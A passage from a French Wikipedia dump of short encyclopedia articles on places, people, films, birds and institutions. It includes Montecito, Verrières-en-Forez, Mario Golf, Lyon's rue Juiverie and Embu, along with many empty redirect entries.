Oskar Lange enseigna brièvement au Royaume-Uni ou aux États-Unis dans les années 1930, où il côtoya Joseph Schumpeter. Il retourna en Pologne communiste après la fin de la Seconde Guerre mondiale et entama une carrière de diplomate tout en continuant son œuvre économique.
Il est connu pour avoir participé au débat intellectuel sur la possibilité du calcul économique dans une économie socialiste lancé par Ludwig von Mises avec son article de 1920 "Le calcul économique en régime collectiviste". Avec Fred M. Taylor, Lange tenta de dépasser l'impossibilité pratique d'une économie socialiste avancée par Mises en proposant un « socialisme de marché », où les prix, sans être libres, seraient fixés par l'État, par « essai et erreur », en reprenant des mécanismes de marché.
Son œuvre tente de relier la théorie économique marxiste et celle de l'école néoclassique. Il était en particulier très critique de la théorie de la valeur-travail marxiste.
Il est proche du courant économique dit du "socialisme cybernétique". Cette tradition cybernétique tente de réfléchir aux mécanismes de coordination et de planification sous une économie socialiste.
Honneurs.
Il a reçu le titre de docteur "honoris causa" de l'université Jagellonne de Cracovie en 1964.

</doc>
<doc id="2843987" url="https://fr.wikipedia.org/wiki?curid=2843987" title="Montecito (Californie)">
Montecito (Californie)

Montecito est un "" (CDP) proche de la ville de Santa Barbara, dans l'État de Californie aux États-Unis. Montecito est située dans le comté de Santa Barbara, considéré comme l'un des plus aisés de Californie.
La commune possède un microclimat exceptionnel, en faisant un lieu de villégiature hivernale réputé aux États-Unis. Michael Jackson, Oprah Winfrey, Rob Lowe, Gwyneth Paltrow, Natalie Portman, le prince Harry de Sussex, Meghan Markle et plusieurs autres célébrités et hommes d'affaires y possèdent ou ont possédé des propriétés. On y trouve des propriétés immobilières de grande valeur, réparties le long de la côte et au-dessus de East Valley Road.
Histoire.
Précédant l'arrivée des colons espagnols, la région du Montecito actuel était habitée par le peuple Chumash. À la fin du , des soldats démissionnés du Presidio de Santa Barbara se sont vu accorder des concessions dans la région au lieu de pensions. Un petit village s'établit graduellement près d'East Valley Road, abritant des magasins et plusieurs auberges. 
À la suite de l'annexion de la Californie aux États-Unis en 1848, des colons américains se mirent à s'établir, attirés par la promesse de terres à bon marché. Dans les années 1890, les fermiers de la région ont été rejoints par de nouveaux arrivants fortunés de la Côte est, cherchant un refuge d'hiver. 
Géographie.
Montecito est situé à au nord-ouest de Los Angeles. Selon son plan communautaire, le CDP est délimité au nord par East Camino Cielo, à l'est par Ortega Ridge Road et Ladera Lane, au sud par l'océan Pacifique.
Climat.
IMontecito connaît un Climat méditerranéen comme ailleurs sur la côte de la Californie du Sud. Les étés sont chauds et secs tandis que les hivers sont frais et pluvieux. La plupart des précipations annuelles sont bornées aux hivers et il y a parfois des vagues de pluie qui peuvent provoquer des inondations et des coulées de boue à travers le terrain vallonné.
Le 9 janvier 2018, il y a eu une coulée de boue désastreuse provoquée par de fortes pluies d'hiver. Les coulées de boue tuèrent 23 personnes et détruisirent 100 maisons. Pendant l'hiver de 2022-23, un hiver particulièrement pluvieux, la ville a été évacuée à cause de craintes d'inondations et de coulées de boue semblables.
Démographie.
La population de Montecito est en baisse constante depuis 2015 avec une moyenne d’âge qui reste stable à environ 50 ans.
La communauté de Montecito est régulièrement classée par le magazine "Forbes" comme l'une des plus riches des États-Unis. Selon le magazine, 21 des 100 personnalités publiques les plus influentes des États-Unis possèdent une propriété foncière à Montecito.
Logement.
Le nombre de logements reste stable avec 4 252 logements en 2019.

</doc>
<doc id="2843990" url="https://fr.wikipedia.org/wiki?curid=2843990" title="Rimeize">
Rimeize



</doc>
<doc id="2843994" url="https://fr.wikipedia.org/wiki?curid=2843994" title="Flynn Robinson">
Flynn Robinson

Flynn James Robinson, né le à Murphysboro dans l'Illinois et mort le , est un joueur américain de basket-ball.
Biographie.
Meneur de jeu issu de l'université du Wyoming, Robinson joua sept saisons en NBA (1966 à 1973) et une saison (1973-1974) dans la ligue défunte de l'American Basketball Association. Il réalisa des moyennes de 14 points et 3 passes décisives par match durant sa carrière et participa au NBA All-Star Game 1970. Robinson fut le meilleur shooteur NBA aux lancers-francs lors de la saison 1969-1970. Il remporta également un titre de champion NBA avec les Los Angeles Lakers en 1972 qui est considérée comme l'une des meilleures équipes NBA de l'histoire.
En janvier 2005, Robinson fut nommé dans la "Wyoming's All-Century Team".

</doc>
<doc id="2844000" url="https://fr.wikipedia.org/wiki?curid=2844000" title="Note2be.com">
Note2be.com



</doc>
<doc id="2844006" url="https://fr.wikipedia.org/wiki?curid=2844006" title="Verrières-en-Forez">
Verrières-en-Forez

Verrières-en-Forez est une commune française située dans le département de la Loire en région Auvergne-Rhône-Alpes.
Ses habitants sont les Verriérois et les Verriéroises.
Géographie.
Situation.
Situé dans le canton de Montbrison, le village de Verrières-en-Forez est situé dans les montagnes foréziennes dites du « soir » (Massif central).
Le village a une moyenne d’altitude de 833 m. Le point le plus bas est à 540 mètres et le point le plus haut à 1272 mètres.
Communes limitrophes.
Les villages voisins sont Bard, Chazelles-sur-Lavieu, Gumières, Lérigneux, Essertines-en-Châtelneuf. La grande ville la plus proche est Saint-Étienne (environ 45 km).
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat de montagne, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfa, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été chaud sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat de montagne ou de marges de montagne et est dans la région climatique Nord-est du Massif Central, caractérisée par une pluviométrie annuelle de 800 à , bien répartie dans l’année. Elle est en outre dans la zone H1c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Saint-Anthème à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Verrières-en-Forez est catégorisée commune rurale à habitat très dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Montbrison, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Voies de communication et transports.
Les gares les plus proches de Verrières-en-Forez se trouvent à Montbrison (7 km), Saint-Romain-le-Puy (9 km), Sury-le-Comtal (15 km), Boën-sur-Lignon (19 km),Montrond-les-Bains (21 km).
Logement.
Avec une superficie totale de et une population totale de 719 habitants (en 2020), la densité de population est de 34 habitants au .
En 2020, la commune comportait 409 logements dont 68,6 % sont des résidences principales, 21,1 % sont des résidences secondaires et des logements occasionnels et 10,3 % des logements vacants.
94,9 % sont des maisons et 4,9 % des appartements.
Parmi les résidences principales, 80 %, sont occupées par des propriétaires.
Toponymie.
L’origine du nom Verrières daterait après J.C. Un camp romain aurait été installé entre 235 et 238 et commandé par « Vérrus ». Le nom du village découlerait du nom de ce commandeur.
Verrières se trouve sur une voie romaine reliant la plaine du Forez à l’auvergne.
Histoire.
Au Moyen Âge, la province de Forez est administrée par les comtes de Forez et dépendant de la baronnie d'Écotay.
Sur son territoire, se trouvent les fiefs de Beauvoir et du Soleillant.
Le petit séminaire de Verrières.
Pendant la Révolution française de 1789 une politique de persécution et déchristianisation sévit en France. La France manque alors de prêtres et de lieu de formation de ceux-ci.
Dans ce contexte l’abbé Perrier (prêtre réfractaire, condamné à mort, qu'on aidera à faire évader), est nommé curé du village de Verrières-en-Forez.
En 1803, il décide de se mettre à accueillir et de former des futurs prêtres (des séminaristes). Très vite les demandes d'accueillent et de formation affluent. En 1807 on compte 107 élèves séminaristes et 313 en 1809.
Grâce au don de 20 000 francs d'Antoinette Montet, pieuse catholique, maîtresse d'école et rebouteuse (métier de soigner, par des procédés empiriques, les foulures et les luxations), l’abbé Perrier parvient à acheter le château du Soleillant et une partie de son domaine et à installer le séminaire. Parmi les nombreux séminaristes passés par ce séminaire on retient notamment : saint Jean-Marie Vianney, saint Marcellin Champagnat et le vénérable Jean-Claude Colin.
Le 9 décembre 1905, est adopté la loi de séparation des Églises et de l'État stipule que « tous les établissements publics du culte » doivent être transférés à des associations cultuelles. Le petit séminaire de Verrières et son domaine sont repris par le département.
Le 15 décembre 1906 le petit séminaire de Verrières est fermé.
Par décret du président de la République du 20 décembre 1909, les bâtiments du petit séminaire sont attribués à la commune Verrières-en-Forez. Cependant la commune, endettée, est incapable de faire face aux dépenses d'entretien et de rénovation de ces bâtiments, décide de les vendre à des particuliers. Aujourd'hui, la quasi-totalité des bâtiments a été détruit. Il ne subsiste qu’un arc monumental, des murs de l’ancienne chapelle et un corps de bâtiment dans une propriété privée et le lycée professionnel du Haut-Forez.
Politique et administration.
La commune de Verrières-en-Forez fait partie de la Communauté d'agglomérations Loire Forez Agglomération.
Liste des maires de Verrières-en-Forez.
L'organisation administrative de la France date de la Révolution française de 1789, lorsque l'assemblée constituante met en place l'administration municipale.
Suivant les régimes politiques de l'époque les maires furent élus par la population ou nommés par le préfet.
Économie &amp; Emploi.
En 2020, la médiane du revenu de la commune est de 22 260 euros.
En 2020, le taux de chômage de la commune est de 8,6 % de la population active. Chez les jeunes de 15 à 24 ans le taux de chômage est alors de 25 %. Parmi les actifs disposant d'un travail 74 % sont des salariés.
Culture locale et patrimoine.
Évènements.
Le festival d'art de rue "les Monts de la Balle" a lieu le weekend de la pentecôte depuis 1996 et rassemble environ spectateurs.

</doc>
<doc id="2844012" url="https://fr.wikipedia.org/wiki?curid=2844012" title="Montecito">
Montecito

Montecito peut faire référence à :

</doc>
<doc id="2844013" url="https://fr.wikipedia.org/wiki?curid=2844013" title="Voie maritime">
Voie maritime



</doc>
<doc id="2844020" url="https://fr.wikipedia.org/wiki?curid=2844020" title="Terrorisme international">
Terrorisme international



</doc>
<doc id="2844026" url="https://fr.wikipedia.org/wiki?curid=2844026" title="Blanchiment de l'argent">
Blanchiment de l'argent



</doc>
<doc id="2844031" url="https://fr.wikipedia.org/wiki?curid=2844031" title="Bescoins">
Bescoins



</doc>
<doc id="2844032" url="https://fr.wikipedia.org/wiki?curid=2844032" title="Mario Golf (jeu vidéo)">
Mario Golf (jeu vidéo)

Mario Golf, ou au Japon, est un jeu vidéo de golf développé par Camelot et édité par Nintendo en 1999 sur Nintendo 64. Le jeu est porté la même année sur Game Boy Color (le titre est au Japon).
Le jeu est compatible avec le Transfer Pak, ce qui permet de transférer des données et des personnages de la version Nintendo 64 sur Game Boy Color, et vice-versa.
Système de jeu.
Le jeu est basiquement une transposition virtuelle du jeu de golf et suit essentiellement les règles du jeu réel.
Mécaniques de jeu.
Version Nintendo 64.
Pour frapper la balle, le joueur doit appuyer en rythme sur le bouton A de la manette : la première pression lance le déplacement latéral d’un curseur le long d'un repère gradué situé au bas de l'écran. La seconde pression influence la distance totale du coup en fonction de l'endroit du repère gradué où se situe le curseur au moment où le bouton est pressé. Le curseur continue alors son déplacement en revenant vers son point de départ. Le joueur doit presser une troisième fois le bouton A en essayant d’arrêter le curseur au plus prés de la position initiale. S'il y parvient, le coup suivra exactement la trajectoire prévue, sinon il s'en éloignera proportionnellement au degré d'écart entre les positions initiales et finales du curseur.
Selon la position du personnage du joueur sur le parcours une marge d'erreur plus ou moins grande est accordée dans la réalisation du coup. Par exemple, si la balle se situe dans une zone d'herbes hautes, la distance maximale possible du coup sera amoindrie et la marge d'erreur réduite. Un segment de couleur rouge sous le repère gradué et parallèle à celui-ci indique au joueur la marge autorisée.
D'autres éléments peuvent influer sur le comportement de la balle : le vent, la pluie, les dénivellations du terrain... Des icônes présentent à l'écran ou bien des systèmes de grilles de couleurs permettent au joueur de voir ces informations avant de jouer le coup. Les boutons permettent de modifier la direction du coup et la puissance du coup, de déplacer la caméra, de changer de club ou d'imprimer de l'effet à la trajectoire de la balle.
Modes de jeux.
Le jeu se compose d'une série de modes de jeux spécifiques mettant en jeu diverses variantes des règles du golf :
Personnages.
Le jeu comporte des personnages issus de l'univers des jeux "Super Mario" et d'autres spécifiques à "Mario Golf 64".
Le livret du jeu indique les caractéristiques suivantes :
Personnages non-indiqués dans le livret, mais jouables dans certaines conditions :
Parcours.
Le jeu propose 6 parcours différents et 2 parcours de minigolf.
Les parcours vont en difficulté croissante.
Parcours de minigolf.
A. Luigi's Garden : chaque trou a la forme d'un chiffre (1, 2, 3, 4, 5, 6, 8, 9) pour les 9 premiers trous et celle d'une lettre (A,B,C, D, E, F, G, H, I) pour les 9 derniers.
B. Peach's Castle : chaque trou à la forme d'une lettre (de J à Z), sauf le dernier qui prend la forme d'un point d'interrogation et oblige à un saut périlleux pour passer du corps du symbole au point.

</doc>
<doc id="2844033" url="https://fr.wikipedia.org/wiki?curid=2844033" title="Aigrette ardoisée">
Aigrette ardoisée

L'Aigrette ardoisée (Egretta ardesiaca) est une espèce d'oiseaux aquatiques de la famille des Ardeidae.
Description.
L'Aigrette ardoisée mesure de 48 à .
Cette espèce ne présente pas de dimorphisme sexuel. Son plumage est entièrement noir à reflets gris ardoise ou bleus. Comme toutes les aigrettes, elle présente de longues plumes lancéolées portant ce nom. Celles-ci se rencontrent sur le dessus de la tête, la nuque, le cou et le manteau.
Alimentation.
L'Aigrette ardoisée consomme essentiellement de petits poissons mais aussi des crustacés et des insectes. Elle présente la caractéristique comportementale de placer ses ailes au-dessus d'elle de manière à faire de l'ombre sur l'eau, à la manière d'un parapluie, ce qui lui permet de voir sans reflets et de faire croire aux plus gros poissons qu'ils sont à l'abri et donc de moins bouger.

</doc>
<doc id="2844035" url="https://fr.wikipedia.org/wiki?curid=2844035" title="Marc Lotz">
Marc Lotz

Marc Lotz (né le à Fauquemont) est un coureur cycliste néerlandais.
Biographie.
Marc Lotz passe professionnel en 1998 dans l'équipe Rabobank. Il passe sept saisons dans cette formation. Rarement victorieux, c'est avant tout un coéquipier, notamment pour Michael Boogerd sur le Tour de France auquel il participe cinq fois. Non-sélectionné pour le Tour de France 2002, il est contraint à l'abandon lors de l'édition suivante au soir de la première étape à cause d'une chute. En 2004, il est une fois cinquième et une fois sixième d'étape. Il remporte cette année sa principale victoire, le Tour du Haut-Var.
En 2005, il rejoint l'équipe Quick Step-Innergetic. Deuxième de la Flèche brabançonne en mars, il met fin à son contrat le et avoue avoir consommé de l'EPO. Il est dès lors suspendu deux ans.
Devenu professeur de mathématiques durant sa suspension, il fait un court retour dans le peloton en 2007 dans la modeste équipe Löwik Meubelen. Il prend notamment la du championnat des Pays-Bas.
Malgré des contacts avec l'équipe Pedaltech-Cyclingnews pour 2008, il ne trouve pas d'équipe et met fin à sa carrière en 
Résultats sur les grands tours.
Tour de France.
5 participations
Tour d'Italie.
1 participation
Tour d'Espagne.
2 participations

</doc>
<doc id="2844041" url="https://fr.wikipedia.org/wiki?curid=2844041" title="Egretta ardesiaca">
Egretta ardesiaca



</doc>
<doc id="2844043" url="https://fr.wikipedia.org/wiki?curid=2844043" title="Armée du Kwangtun">
Armée du Kwangtun



</doc>
<doc id="2844044" url="https://fr.wikipedia.org/wiki?curid=2844044" title="Banque de données en santé publique">
Banque de données en santé publique

Créée à l’initiative de la Direction générale de la santé, la Banque de données en santé publique (ou "BDSP") était un portail d’information en ligne fondé sur une couverture multidisciplinaire de la santé publique. Il proposait depuis 1993 des services d'information en ligne destinés aux professionnels des secteurs sanitaire et social en exercice ou en formation. Ce portail était totalement gratuit depuis le . Des difficultés de financements semblent avoir conduit à la fermeture du site courant 2019. L'archive de la base de données a été pris en charge par l'INIST avant que le service ne soit définitivement interrompu à l'été 2022.
Fonctionnement.
La BDSP était le résultat du travail collaboratif d’un réseau de coopération documentaire constitué d’une quarantaine d’organismes.
Sur le plan juridique, la BDSP était régie par une convention cadre, en date de 1993, qui définissait son fonctionnement. La mise en œuvre et la gestion des moyens ont été confiées à l'École des hautes études en santé publique (EHESP) qui assumait son engagement envers le réseau en contribuant au financement d’une équipe permanente, connue sous le nom de Service de la Banque de données en santé publique.
Cette équipe de permanents assurait la logistique de suivi des services d’information, développait les outils informatiques nécessaires, assurait l’animation du réseau, la conduite des projets communs et la promotion de la BDSP auprès des publics utilisateurs.
Services.
Le site proposait un annuaire de sites, des appels à projets, une base documentaire, des bibliographies, le blog du site, des collections, des colloques, un glossaire, des offres d'emploi et un thésaurus.
Base documentaire.
En 2018, la BDSP était riche de 524 867 documents référencés, dont 98 050 qui étaient accessibles gratuitement en texte intégral. En 2017, elle recevait 3 000 visites quotidiennes et 400 000 visiteurs originaires de plus de dix pays.
Fermeture.
En raison de difficultés de financements, la fermeture du site fut annoncée le 16 novembre 2018, pour le 1er juillet 2019. Une mobilisation de la communauté des professionnels de santé publique s'est ensuivie. Plus de 160 structures ont signé un texte intitulé "La BDSP brûle et nous regardons ailleurs". La fermeture a été effective le 5 juillet 2019 mais l'archive de la base de données a alors été mise en ligne sur le site de l’Inist–CNRS, tout en restant gérée par l’École des hautes études en santé publique (EHESP). Finalement, le service a cependant été définitivement interrompu à l'été 2022.

</doc>
<doc id="2844045" url="https://fr.wikipedia.org/wiki?curid=2844045" title="Estanys de Baiau">
Estanys de Baiau

Les estanys de Baiau sont un ensemble de deux étangs des Pyrénées espagnoles situés sur la commune d'Alins dans la comarque de Pallars Sobirà (Catalogne) près de la frontière entre l'Andorre et l'Espagne et dans le périmètre du parc naturel de l'Alt Pirineu.
Toponymie.
"Estanys" (pluriel de "estany") provient du latin "stagnum" (« étendue d'eau ») qui a également donné "estanque" en espagnol et « étang » en français. "Baiau" serait d'origine pré-romane bascoïde, comme de nombreux toponymes andorrans et catalans, à rapprocher du basque "ibai" signifiant également « étang » ou « cours d'eau ». Le toponyme "estanys de Baiau" est de ce fait une tautologie.
Géographie.
Les "estanys de Baiau" sont surplombés à l'est par les sommets élevés du massif du Coma Pedrosa avec du sud au nord : le pic de Sanfonts (), l'agulla de Baiau (), le pic de Baiau (), la Roca Entravessada () et le pic de Médécourbe (). Ces sommets marquent la frontière hispano-andorrane qui ne se trouve qu'à du lac. À l'ouest s'élèvent les sommets du cirque de Vallpeguera dominés par le pic de Vallpeguera ().
Voies d'accès.
L'estanys de Baiau est situé sur le trajet du GR 11 espagnol ce qui le rend accessible depuis l'Andorre par l'intermédiaire du "port de Baiau" ou de la "Collada dels Estanys Forcats". Un refuge non gardé ("refugi de Baiau") de destiné aux randonneurs se trouve côté espagnol au nord-ouest du lac à . Côté andorran, le refuge del Pla de l'Estany et le refuge de Coma Pedrosa sont également accessibles.

</doc>
<doc id="2844047" url="https://fr.wikipedia.org/wiki?curid=2844047" title="Éditions Choiseul">
Éditions Choiseul



</doc>
<doc id="2844050" url="https://fr.wikipedia.org/wiki?curid=2844050" title="Jean-Claude Flamand">
Jean-Claude Flamand



</doc>
<doc id="2844051" url="https://fr.wikipedia.org/wiki?curid=2844051" title="Kuala-Lumpur">
Kuala-Lumpur



</doc>
<doc id="2844052" url="https://fr.wikipedia.org/wiki?curid=2844052" title="Pile ou Farces">
Pile ou Farces

Pile ou farces (") est un court métrage d'animation américain de la série des Donald Duck, sorti le réalisé par les studios Disney.
Synopsis.
On est le et c'est l'anniversaire de Donald. C'est pourquoi ses neveux veulent lui offrir une boîte de cigares. Toutefois ils se retrouvent à court de monnaie pour le faire.
Titre en différentes langues.
D'après IMDb :
Commentaire.
Ce court métrage est censuré pendant un certain temps aux USA parce qu'on y voit de jeunes canetons fumer des cigares.

</doc>
<doc id="2844057" url="https://fr.wikipedia.org/wiki?curid=2844057" title="Meru (ville)">
Meru (ville)

Meru est une ville de la province orientale du Kenya, au centre du pays, à environ 8 kilomètres au nord de l'équateur. Meru est située sur la rivière Kathita et le versant nord-est du mont Kenya, à d'altitude, dans une région de forêts et de clairières. L'éthnie dominante est la tribu Ameru.
La route est accessible par route pavée, soit par le sud depuis Embu, soit par le nord-ouest depuis Nanyuki et Timau. Le district de Meru est un point de départ pour Samburu et les réserves nationales Réserve nationale de Buffalo Springs et Lewa Downs "via" Isiolo au nord, et le parc national de Meru au nord-est "via" Maua dans les Nyambeni Hills.
Meru est un centre d'affaires, d'agriculture et d'éducation pour le Nord-Est du Kenya. La ville possède des banques et des hôtels, des marchés et des terminaux de transport. Elle pratique le commerce du café, du thé, du bois de construction, du bétail, des produits laitiers et des légumes. Il existe plusieurs lycées, dont un réservé aux filles, la Kaaga Girls School. L'université Emory a un partenariat avec la "Meru High School" pour partager des ordinateurs, des livres et des équipements scientifiques, à la mémoire de George Brumley. Il existe aussi plusieurs écoles techniques, notamment le "Meru Technical Institute" et le "Meru College of Technology".
Religion.
Meru est le siège d'un évêché catholique.

</doc>
<doc id="2844060" url="https://fr.wikipedia.org/wiki?curid=2844060" title="Think tanks">
Think tanks



</doc>
<doc id="2844062" url="https://fr.wikipedia.org/wiki?curid=2844062" title="BFB">
BFB

BFB peut faire référence à :

</doc>
<doc id="2844063" url="https://fr.wikipedia.org/wiki?curid=2844063" title="Bfb">
Bfb



</doc>
<doc id="2844064" url="https://fr.wikipedia.org/wiki?curid=2844064" title="Rapanea rhododendroides">
Rapanea rhododendroides

Rapanea rhododendroides est une espèce de plantes de la famille des "Myrsinaceae".
C'est une espèce africaine. On la trouve notamment en Tanzanie et au Kenya.
Elle est appelée "Mugaita" en langue Kikuyu. Cependant d'autres espèces peuvent aussi prendre ce nom.

</doc>
<doc id="2844065" url="https://fr.wikipedia.org/wiki?curid=2844065" title="Flamand Barny">
Flamand Barny



</doc>
<doc id="2844068" url="https://fr.wikipedia.org/wiki?curid=2844068" title="Mon fils est-il un assassin ?">
Mon fils est-il un assassin ?

Mon fils est-il un assassin ? (") est un film américain du cinéma indépendant de 1993 réalisé par Gary Davis.

</doc>
<doc id="2844071" url="https://fr.wikipedia.org/wiki?curid=2844071" title="Bibliothèque nationale d'Andorre">
Bibliothèque nationale d'Andorre

La Bibliothèque nationale d'Andorre ("Biblioteca Nacional d'Andorra" en catalan) est créée en 1930. C'est là que sont gérés le dépôt légal et les droits de copie pour l'Andorre.

</doc>
<doc id="2844072" url="https://fr.wikipedia.org/wiki?curid=2844072" title="Donald marin">
Donald marin

Donald marin ("Sea Salts") est un court métrage d'animation américain de la série des Donald Duck, sorti le réalisé par les studios Disney.
Synopsis.
Un vieux criquet raconte son aventure avec le capitaine Donald Duck sur une île déserte, après que leur navire s'y soit échoué...
Titre en différentes langues.
D'après IMDb :

</doc>
<doc id="2844074" url="https://fr.wikipedia.org/wiki?curid=2844074" title="Tim Sander">
Tim Sander

Tim Sander est un acteur allemand né le à Berlin en Allemagne.
Il est le fils de l'acteur Rudiger Sander et de l'actrice Isabelle Sander.

</doc>
<doc id="2844076" url="https://fr.wikipedia.org/wiki?curid=2844076" title="Memorial university">
Memorial university



</doc>
<doc id="2844077" url="https://fr.wikipedia.org/wiki?curid=2844077" title="Memnon d'Éphèse">
Memnon d'Éphèse

Memnon d'Éphèse est l'évêque (vers 428-440) de la métropole d'Asie, Éphèse, lors de la réunion du Troisième concile œcuménique en 431. À ce titre, il joue un rôle important dans le déroulement du concile en tant qu'allié de Cyrille d'Alexandrie, pour garantir la victoire du parti alexandrin. Arrêté et déposé pour ses actions, il regagne son évêché en 433 après la réconciliation entre Cyrille et Jean d'Antioche.

</doc>
<doc id="2844078" url="https://fr.wikipedia.org/wiki?curid=2844078" title="Abo">
Abo

Nom.
Abo peut faire référence à :
Sigle.
Le sigle ABO peut faire référence à :
Code.
Le code ABO peut faire référence à :

</doc>
<doc id="2844080" url="https://fr.wikipedia.org/wiki?curid=2844080" title="Galvanic skin response">
Galvanic skin response



</doc>
<doc id="2844081" url="https://fr.wikipedia.org/wiki?curid=2844081" title="Sel marin">
Sel marin



</doc>
<doc id="2844083" url="https://fr.wikipedia.org/wiki?curid=2844083" title="L'université Memorial">
L'université Memorial



</doc>
<doc id="2844084" url="https://fr.wikipedia.org/wiki?curid=2844084" title="Rue Juiverie (Lyon)">
Rue Juiverie (Lyon)

La rue Juiverie est une rue piétonne pavée du quartier du Vieux Lyon, dans le de Lyon. D'orientation nord-sud, elle relie la place Saint-Paul à l'embranchement de la rue de la Loge et de la montée du Change.
Origine du nom.
Le nom rend hommage à la Juiverie, c’est-à-dire la population juive qui résidait dans la rue au Moyen Âge. La toponymie a la mémoire longue puisqu’ils ont été expulsés en 1379. Les dates sont difficiles à saisir en ces périodes sombres puisqu’ils auraient été chassés par Philippe le Bel en 1311.
La rue Juiverie est attestée en 1550, puisqu'elle est présente dans le Plan scénographique de Lyon. Elle a aussi été appelée rue Jurie en 1680. Auparavant, elle a porté le nom de rue de la Porcherie (1371).
Histoire.
Le site est occupé depuis l’époque romaine. Après la chute de l’Empire romain, puis à l’époque burgonde, la population de Lyon se rassembla dans le quartier qui resta au centre de Lyon jusqu’à la fin de la Renaissance. C'est le roi Louis le Débonnaire qui aurait donné l'autorisation officielle aux juifs de s'installer et de construire une synagogue. Une médaille l'attestait, retrouvée un peu plus haut dans la maison dite de la Bréda, puis perdue. En 1387, le roi émet un arrêt pour préciser la position des juifs vis-à-vis de la justice de Lyon, ils ne devaient pas prendre part à la garde mais verser leurs impôts.
En 1466, la filiale des Médicis est transférée de Genève à Lyon où ils louent une maison dans la rue. Charles VIII a fait son entrée dans Lyon le de retour d’Italie. À cette occasion il a participé à trois tournois, place de la Grenette, place des Cordeliers et place de la Juiverie. La transformation de la rue date des années 1490, il y avait alors un marché aux bestiaux qui gênait les riches négociants qui commençaient à faire bâtir leurs maisons. Ce marché est déplacé en 1490 rue de la Croix de Colle. La rue est alors devenue l'une des plus belles de Lyon.
Nostradamus y a vécu. Catherine de Medicis venait le consulter.
Architecture.
La rue est entièrement pavée et légèrement tortueuse. L’ensemble des façades actuelles datent de la Renaissance sur des bases beaucoup plus anciennes.
Il existe une traboule du n°5 jusqu'au 3 place Saint-Paul
La plupart des façades sont belles et méritent d’être détaillées avec des fenêtres à meneaux ouvragés, des portes avec des sculptures cariatides soutenant l’imposte, des lions. Il convient de signaler plus particulièrement :
Tout au long de la rue, on a ajouté les blasons de plusieurs échevins de la ville depuis Guy de la Mure en 1294 jusqu’à Jacques Imbert Colomès chassé par la Révolution. Après la Révolution, le rôle des échevins a été repris par les maires.
Il est bon de pousser les portes pour aller voir les escaliers, les galeries, les tours, les puits, les allées soutenues par des croisées d’ogives aux petites sculptures. Certains habitants ont accroché des gargouilles modernes à leurs fenêtres.
Culture.
Le célèbre film de Bertrand Tavernier, "l'Horloger de Saint-Paul", a été tourné dans le quartier et a inspiré l'enseigne de l'actuel horloger de la rue.
Accessibilité.
Ce site est desservi par les stations de métro Hôtel de Ville - Louis Pradel et Vieux Lyon - Cathédrale Saint-Jean.

</doc>
<doc id="2844086" url="https://fr.wikipedia.org/wiki?curid=2844086" title="L'université Memorial du Terre-Neuve">
L'université Memorial du Terre-Neuve



</doc>
<doc id="2844087" url="https://fr.wikipedia.org/wiki?curid=2844087" title="Mientras tanto">
Mientras tanto

Mientras tanto est un film franco-argentin réalisé par Diego Lerman et sorti en 2006.
Synopsis.
De nos jours, à Buenos Aires, la vie au jour le jour de quelques personnes dans un pays en pleine mutation.

</doc>
<doc id="2844098" url="https://fr.wikipedia.org/wiki?curid=2844098" title="Hyères (homonymie)">
Hyères (homonymie)

Hyères peut désigner :

</doc>
<doc id="2844100" url="https://fr.wikipedia.org/wiki?curid=2844100" title="Converse">
Converse

Converse désigne :

</doc>
<doc id="2844101" url="https://fr.wikipedia.org/wiki?curid=2844101" title="BDSP">
BDSP



</doc>
<doc id="2844102" url="https://fr.wikipedia.org/wiki?curid=2844102" title="Gsr">
Gsr



</doc>
<doc id="2844106" url="https://fr.wikipedia.org/wiki?curid=2844106" title="Hyère">
Hyère



</doc>
<doc id="2844111" url="https://fr.wikipedia.org/wiki?curid=2844111" title="Embu (Kenya)">
Embu (Kenya)

Embu est le chef-lieu de la province orientale du Kenya, à quelques dizaines de kilomètres au sud de l'équateur et à 120 kilomètres au nord-est de Nairobi. Embu est située sur la rivière Ruvingaci et le versant sud-est du mont Kenya, à d'altitude, et s'étend sur une dizaine de kilomètres. Elle a été fondée en 1906 par des colons britanniques. L'éthnie dominante est la tribu Embu. La ville est réputée pour ses jacarandas. Elle possède une petite piste d'atterrissage à 7 kilomètres au sud-est du centre.
Religion.
Embu est le siège d'un évêché catholique créé le .

</doc>
<doc id="2844112" url="https://fr.wikipedia.org/wiki?curid=2844112" title="Modèle des Nations Unies">
Modèle des Nations Unies



</doc>
<doc id="2844118" url="https://fr.wikipedia.org/wiki?curid=2844118" title="Niccolò Sanudo">
Niccolò Sanudo

Niccolò Sanudo, cinquième duc de Naxos (mort en 1341).
Biographie.
Famille et jeunesse.
La famille Sanudo aurait, sous le nom de "Candiano", fourni plusieurs doges, fonctionnaires et ambassadeurs à la Sérénissime avant de subir une éclipse au puis d'occuper une place éminente à partir du . Marco Sanudo, le fondateur de la dynastie, participa à la quatrième croisade en 1204 puis fonda le duché de Naxos. Angelo Sanudo, son fils, passa la plus grande partie de sa vie à guerroyer, principalement pour ses suzerains l'empereur latin puis après 1248 le prince d'Achaïe. Le règne du grand-père de Niccolò, Marco II Sanudo, fut perturbé. Le duché de Naxos ne cessa de rétrécir sous les coups de l'Empire byzantin.
